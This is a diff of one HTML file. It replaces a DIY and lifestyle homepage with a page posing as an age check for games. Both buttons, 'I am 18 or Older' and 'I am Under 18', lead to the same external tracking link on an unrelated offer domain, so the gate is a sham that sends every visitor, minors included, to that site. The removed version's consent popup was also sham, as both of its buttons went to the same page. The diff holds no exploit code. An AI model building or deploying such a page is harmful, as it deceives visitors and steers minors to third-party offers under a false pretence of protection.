@@ -1,112 +1,161 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NeoMagicSpin – DIY & Lifestyle Hub</title>
-<link rel="stylesheet" href="style.css">
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Age Verification</title>
+      <style>   
+        /* Reset some basic styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            height: 100%;
+            overflow-x: hidden;
+        }
+
+        /* Background sections */
+        .background-section {
+            height: 100vh; /* Full viewport height */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        /* Overlay for background sections */
+        .background-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5); /* Dark overlay */
+            z-index: 1;
+        }
+        /* Container for the age verification page, fixed in place */
+        .age-verification-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            text-align: center;
+            padding: 20px;
+            z-index: 2; /* Ensure the container is above the overlay */
+        }
+
+        .logo {
+            max-width: 150px;
+            margin-bottom: 5px;
+        }
+
+        .content h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #000;
+        }
+
+        .content p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #000;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .btn {
+            background-color: #0081a1;
+            color: rgb(255, 255, 255);
+            padding: 10px 20px;
+            text-decoration: none;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #0b00a1;
+        }
+
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            width: 100%;
+        }
+
+        footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive styling */
+        @media (max-width: 480px) {
+            .age-verification-container {
+                width: 300px;
+                height: 300px;
+            }
+
+            .logo {
+                max-width: 100px;
+            }
+
+            .content h1 {
+                font-size: 15px;
+            }
+
+            .content p {
+                font-size: 0.9rem;
+            }
+
+            .btn {
+                padding: 8px 15px;
+                font-size: 0.9rem;
+            }
+              
+        }
+    </style>
 </head>
-
-<body>
-
-<header class="main-header">
-  <div class="logo">NeoMagicSpin</div>
-  <nav>
-    <a href="index.html">Home</a>
-    <a href="diy-projects.html">DIY Projects</a>
-    <a href="home-hacks.html">Home Hacks</a>
-    <a href="cleaning.html">Cleaning</a>
-    <a href="garden.html">Garden</a>
-    <a href="blog.html">Blog</a>
-    <a href="contact.html">Contact</a>
-  </nav>
-</header>
-
-<section class="hero">
-  <h1>Turn Ordinary Homes Into Beautiful Spaces</h1>
-  <p>
-    NeoMagicSpin brings you easy DIY ideas, smart cleaning routines,
-    organisation tips and lifestyle inspiration designed for modern Australian homes.
-  </p>
-  <button id="exploreBtn">Start Exploring</button>
-</section>
-
-<section class="categories">
-  <h2>Explore Our Categories</h2>
-  <div class="cat-grid">
-    <a href="diy-projects.html" class="card">DIY Home Décor</a>
-    <a href="home-hacks.html" class="card">Smart Home Hacks</a>
-    <a href="cleaning.html" class="card">Cleaning & Organisation</a>
-    <a href="garden.html" class="card">Garden & Balcony</a>
-    <a href="blog.html" class="card">Lifestyle Blog</a>
-    <a href="contact.html" class="card">Get In Touch</a>
-  </div>
-</section>
-
-<section class="trending">
-  <h2>Trending Guides</h2>
-  <div class="trend-grid" id="trendBox"></div>
-</section>
-
-<section class="why-us">
-  <h2>Why Choose NeoMagicSpin?</h2>
-  <div class="cat-grid">
-    <div class="card">Simple DIY projects anyone can follow</div>
-    <div class="card">Lifestyle tips tailored for Aussie homes</div>
-    <div class="card">Weekly updated content for fresh inspiration</div>
-    <div class="card">Clean layouts with easy step-by-step guides</div>
-  </div>
-</section>
-
-<section class="newsletter">
-  <h2>Get Free Weekly Home Ideas</h2>
-  <p>Subscribe for DIY inspiration, organisation tips and lifestyle hacks.</p>
-  <input type="email" placeholder="Enter your email">
-  <button>Subscribe</button>
-</section>
-
-<footer>
-  <p>© 2026 NeoMagicSpin. All rights reserved.</p>
-  <div class="footer-links">
-    <a href="privacy.html">Privacy Policy</a>
-    <a href="terms.html">Terms & Conditions</a>
-    <a href="cookies.html">Cookie Policy</a>
-    <a href="disclaimer.html">Disclaimer</a>
-  </div>
-</footer>
-<!-- Age Verification Popup -->
-<div id="age-verification" class="age-overlay">
-  <div class="age-popup">
-    <h2>Welcome to NeoMagicSpin</h2>
-    <p>By continuing, you agree to our Terms, Privacy, Cookies, and Disclaimer. All DIY projects are educational; follow safety instructions.</p>
-    <div class="age-buttons">
-      <button id="btn-yes">I Agree</button>
-      <button id="btn-no">No</button>
+<body cz-shortcut-listen="true">
+    <!-- Fixed age verification container -->
+    <div class="age-verification-container">
+        <div class="content">
+           
+            <h1>Ready to Play?</h1>
+<p>Before you jump in, make sure you're 18 or above to enjoy the games here.</p>
+            <div class="buttons">
+                <a href="http://hikingoffer.site/?utm_campaign=bR2isr7GVw&v1=[v1]&v2=[v2]&v3=[v3]" class="btn enter">I am 18 or Older</a>
+                <a href="http://hikingoffer.site/?utm_campaign=bR2isr7GVw&v1=[v1]&v2=[v2]&v3=[v3]" class="btn exit">I am Under 18</a>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
- 
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    var yesBtn = document.getElementById("btn-yes");
-    var noBtn = document.getElementById("btn-no");
- 
-    // Change these URLs as you want
-    var yesLink = "/home/";  
-    var noLink = "/home/";  
- 
-    yesBtn.addEventListener("click", function () {
-      window.location.href = yesLink;
-    });
- 
-    noBtn.addEventListener("click", function () {
-      window.location.href = noLink;
-    });
-  });
-</script>
 
-<script src="script.js"></script>
+    <!-- First background section -->
+    <div id="section1" class="background-section"></div>
 
-</body>
-</html>
+    <!-- Second background section -->
+    <div id="section2" class="background-section"></div>
 
+    <!-- Third background section -->
+    <div id="section3" class="background-section"></div>
+</body></html>
